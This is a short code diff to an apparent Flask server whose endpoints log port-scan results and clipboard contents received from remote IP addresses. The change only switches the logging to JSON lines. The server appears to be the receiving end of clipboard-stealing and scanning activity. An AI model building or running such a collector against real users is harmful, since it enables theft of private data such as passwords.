@@ -81,10 +81,15 @@ def scan_results():
     # Check if the IP has already been processed
     if ip not in ip_set_for_portscan:
         ip_set_for_portscan.add(ip)
+        
+        scan_results = {
+            "IP": ip,
+            "Open Ports": open_ports
+        }
 
         # Save the results to the file
         with open(port_scan_file, 'a') as file:
-            file.write(f"IP: {ip} - Open Ports: {', '.join(map(str, open_ports))}\n")
+            file.write(json.dumps(scan_results) + '\n')
 
     return jsonify({"status": "success"}), 200
 
@@ -150,9 +155,14 @@ def receive_data():
 
     clipboard_data = data['data']
     ip = get_real_ip()
+    
+    clipboard_entry = {
+        "IP": ip,
+        "Clipboard Data": clipboard_data
+    }
 
     with open(clipboard_file, 'a') as file:
-        file.write(f"IP: {ip}, Clipboard Data: {clipboard_data}\n")
+        file.write(json.dumps(clipboard_entry) + '\n')
 
     return jsonify({"status": "success"}), 200
 
